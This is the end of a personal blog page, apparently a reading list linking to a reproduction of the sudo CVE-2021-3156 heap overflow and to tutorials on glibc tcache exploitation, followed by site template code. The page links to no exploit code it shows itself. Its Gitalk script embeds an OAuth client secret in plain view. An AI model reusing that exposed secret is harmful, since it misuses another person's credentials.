<p><a href="https://www.anquanke.com/post/id/231408">CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析</a></p>
<p>环境</p>
<p><a href="https://www.sudo.ws/docs/install/">Sudo Installation Notes</a></p>
<p>学习</p>
<p><a href="https://m4x.fun/post/dive-into-tcache/">Dive Into Tcache</a></p>
<p><a href="https://blog.csdn.net/huzai9527/article/details/112875700">glibc TCache机制_huzai9527的博客-CSDN博客_glibc 关闭tcache</a></p>
<p><a href="https://www.cnblogs.com/elvirangel/p/8893916.html">由一道CTF pwn题深入理解libc2.26中的tcache机制</a></p>
<p><a href="https://bbs.pediy.com/thread-249713.htm">[原创]Tcache利用总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a href="https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html">Nightmare</a></p></article>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

</div>
<script type="application/javascript" src='https://m1nn1e.github.io/js/toc.js'></script>
<link rel="stylesheet" href='https://m1nn1e.github.io/css/toc.css' />

<style>
  .container-lg {
    max-width: 1080px;
    align-items: center;
}
</style>
</div>

<div>
<div id="gitalk-container" class="gitalk-container"></div>
<link rel="stylesheet" href='https://m1nn1e.github.io/css/gitalk.css' />
<script src='https://m1nn1e.github.io/js/gitalk.js'></script>

<script>
  const gitalk = new Gitalk({
    clientID: '08b4f959d47f631a12eb',
    clientSecret: '71249b4d50d71de6d3ae1872579e385ba36eff40',
    repo: 'm1nn1e.github.io',
    owner: 'm1nn1e',
    admin: ['m1nn1e'],
    id: eval("location.pathname"),
    distractionFreeMode: false
  });
  (function() {
    gitalk.render('gitalk-container');
  })();
</script>

</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<script type="text/javascript">
  tocbot.init({
    
    tocSelector: '.js-toc',
    
    contentSelector: '.js-toc-content',
    
    headingSelector: 'h2, h3, h4, h5',
    hasInnerContainers: false,
  })
</script>


  
<div class="footer container-xl width-full p-responsive">
  <div
    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://m1nn1e.github.io/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
        <path fill-rule="evenodd"
          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
        </path>
      </svg>
    </a>
    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      
      <li class="mr-3 mr-lg-0">
        
      This is a <a href='https://github.com/MeiK2333/github-style'>github-style</a> blog...</li>
      <li class="mr-3 mr-lg-0">> since 2022/5/15</li> 
      
    </ul>

    
    <div class="back-to-top" id="back_to_top">
      

        
  <span><i class="fas fa-arrow-up"></i></span> 
      
      <span class="scrollpercent">
         <span id="back_to_top_text">0</span>%
      </span>
   </div>
   
  </div>

  
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>


</div>


<script>
  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
     back2TopText = document.querySelector('#back_to_top_text'),
     drawerBox = document.querySelector('#drawer_box'),
     rightSideBar = document.querySelector('.sidebar'),
     viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

     let needScrollTop = targetY - currentY
     let _currentY = currentY
     setTimeout(() => {
        const dist = Math.ceil(needScrollTop / 10)
        _currentY += dist
        window.scrollTo(_currentY, currentY)
        if (needScrollTop > 10 || needScrollTop < -10) {
           scrollAnimation(_currentY, targetY)
        } else {
           window.scrollTo(_currentY, targetY)
        }
     }, 1)
  }

  back2Top.addEventListener("click", function (e) {
     scrollAnimation(document.scrollingElement.scrollTop, 0);
     e.stopPropagation();
     return false;
  });

  window.addEventListener('scroll', function (e) {
     let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
     if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
        back2Top.classList.add('back-top-active');
     }
     if (percent == 0) {
        back2Top.classList.remove('back-top-active');
     }
     if (back2TopText) {
        back2TopText.textContent = Math.floor(percent);
     }
  });
  let hasCacu = false;
 window.onresize = function () {
   calcuHeight();
 }
</script>
</body>

<script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
<script type="text/javascript" src="https://demo.hellozwh.com/source/canvas-nest.min.js"></script>

<script type="application/javascript" src="https://m1nn1e.github.io/js/github-style.js"></script>



</html>